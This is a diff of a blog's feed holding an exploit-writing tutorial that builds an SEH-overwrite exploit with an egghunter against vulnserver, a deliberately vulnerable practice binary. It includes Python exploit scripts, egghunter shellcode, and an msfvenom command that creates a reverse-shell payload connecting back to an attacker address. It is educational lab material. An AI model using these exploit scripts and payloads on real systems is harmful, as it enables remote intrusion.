+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Place your generated string here'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'192.168.1.41'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[+] Fuzzing GMON / with &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s bytes'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GMON / '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Go ahead and restart vulnserver with CTRL+F2 and then execute the new script. You’ll have to pass the exception with ALT+F9.
+After you do this, you’ll see we have overwritten EIP with a new value. Send that value into pattern_offset to find the correct
+offset.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/offset.png&quot; alt=&quot;Offset&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/pattern_offset1.png&quot; alt=&quot;Offset&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Note the offset, yours may differ but mine was 3521. Now remember, we want to overwrite the SE Handler so I’m going to subtract 4
+from the offset. If we didn’t, we would get something like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/wrong.png&quot; alt=&quot;Wrong overwrite&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When we subtract 4 from the offset and verify it, we can now see we properly overwrite the SE Handler.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/overwriting_pointer.png&quot; alt=&quot;Correct overwrite&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;finding-our-return&quot;&gt;Finding our Return&lt;/h2&gt;
+
+&lt;p&gt;Unlike the last buffer overflow, we aren’t going to look for a JMP ESP this time. Instead, we want to find a POP POP RET call.
+This will bring us back to the stack and execute our next SEH. Because we also control that record, we can change the pointer to
+something new. So our buffer looks something like this.&lt;/p&gt;
+
+&lt;p&gt;[String of NOPS] [Pointer to next SEH] [SE Handler] [Random Data]&lt;/p&gt;
+
+&lt;p&gt;So to find our return, we need to find some instruction calls that do pop pop ret. First, let’s look at our modules and make sure
+we can find one without SEH protections enabled.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/safeseh-false.png&quot; alt=&quot;Mona Modules&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like we can once again use essfunc.dll. So lets go find what we need. In immunity, bring up the executable modules with
+ALT+E and double click the essfunc.dll module. In the assembly window hit CTRL+S and enter the sequence. Check the image below
+for reference.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/search-pop-pop-retn.png&quot; alt=&quot;Searching&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, we have a perfect candidate. Let’s take note of this address.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/pop-pop-retn.png&quot; alt=&quot;Found Return&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;squeezing-in-the-shellcode&quot;&gt;Squeezing in the shellcode!&lt;/h2&gt;
+
+&lt;p&gt;Now one problem we have is that after our buffer, we don’t have much room for our shellcode. It’s only something like 52 bytes
+before the end of the stack. We have a few options, but this is where I wanted to toss our EGG in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/seh_egg/control-no-room.png&quot; alt=&quot;No room.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, after we POP POP RET and hit the next SEH, we can continue the flow of the application. What we want to do is JMP over our SE
+Handler into our ‘First Stage’ payload. This is where we’ll put the egghunter. So we’ll use JMP SHORT to jump over the SE
+Handler. \xEB\x06\x90\x90 or jmp short 0x8 nop nop.&lt;/p&gt;
+
+&lt;p&gt;Pro tip: you can verify this with the following.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# python -c 'print &quot;\xEB\x06\x90\x90&quot;' &amp;gt; jmp
+# ndisasm -b 32 jmp
+00000000  EB06              jmp short 0x8
+00000002  90                nop
+00000003  90                nop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So now our buffer looks like this.&lt;/p&gt;
+
+&lt;p&gt;[NOP][PAYLOAD][JMP SHORT 0x8][POP POP RET][EGGHUNTER]&lt;/p&gt;
+
+&lt;p&gt;So what will we use for an egghunter? I went out to
+&lt;a href=&quot;https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/&quot;&gt;corelan&lt;/a&gt; and grabbed the
+NTAccessCheck shellcode. Please go see the
+article. Very helpful&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So our new and improved code looks like this.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3517&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;L'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x625010B4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# POP EBX, POP EBP, RET&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x54\x30\x30\x57&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# W00T&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.37 LPORT=443 -e x86/shikata_ga_nai -v shellcode -f python -b &quot;\x00&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xEB\x06\x90\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;# JMP SHORT 0x8, NOP NOP&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;       
+&lt;span class=&quot;c&quot;&gt;# Egghunter&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4000&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'192.168.1.41'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'[+] Fuzzing GMON / with &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s bytes'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'GMON / '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And that should do it. Your spiffy new overflow is ready to go. Generate your payload, update the script, and fire it off.&lt;/p&gt;</content><author><name>T0w3ntum</name></author><summary type="html">I was really craving some SEH today, but someone mentioned EGG’s and I was like…what the hell, why not. So, going off vulnserver like we did last time, let’s build an exploit against SEH and make like the Easter Bunny and drop some eggs in there as well.</summary></entry><entry><title type="html">Buffer Overflows and You</title><link href="http://localhost:4000/2016-08-05/Buffer-overflows-and-you" rel="alternate" type="text/html" title="Buffer Overflows and You" /><published>2016-08-05T00:00:00-05:00</published><updated>2016-08-05T00:00:00-05:00</updated><id>http://localhost:4000/2016-08-05/Buffer-overflows-and-you</id><content type="html" xml:base="http://localhost:4000/2016-08-05/Buffer-overflows-and-you">&lt;p&gt;I wanted to do an article on Buffer Overflows, there are many articles on Buffer Overflows but this one is mine! I’m going to take it
 easy on the first go and do a simple stack based buffer overflow…Let’s get started.&lt;/p&gt;
 
 &lt;p&gt;For this I’ll be using &lt;a href=&quot;http://www.thegreycorner.com/2010/12/introducing-vulnserver.html&quot;&gt;vulnserver&lt;/a&gt;. It’s an intentionally vulnerable binary for you to practice on. I did this from my Windows 10 machine, but you are free to use whatever flavor of Windows you want. Simply download the files, unzip, and run it. Now remember, this is intentionally vulnerable…So maybe turn off your internet or run it in a VM.&lt;/p&gt;
@@ -104,7 +2087,7 @@ write to the stack.&lt;/p&gt;
 
 &lt;h2 id=&quot;adding-in-shellcode&quot;&gt;Adding in Shellcode&lt;/h2&gt;
 
-&lt;p&gt;As I mentioned, we need to find some room for our shellcode so let’s update our code to squeez in some C’s. I’ll start with 400
+&lt;p&gt;As I mentioned, we need to find some room for our shellcode so let’s update our code to squeeze in some C’s. I’ll start with 400
 bytes of C’s as that should be enough for a simple reverse shell.&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/user/bin/python&lt;/span&gt;
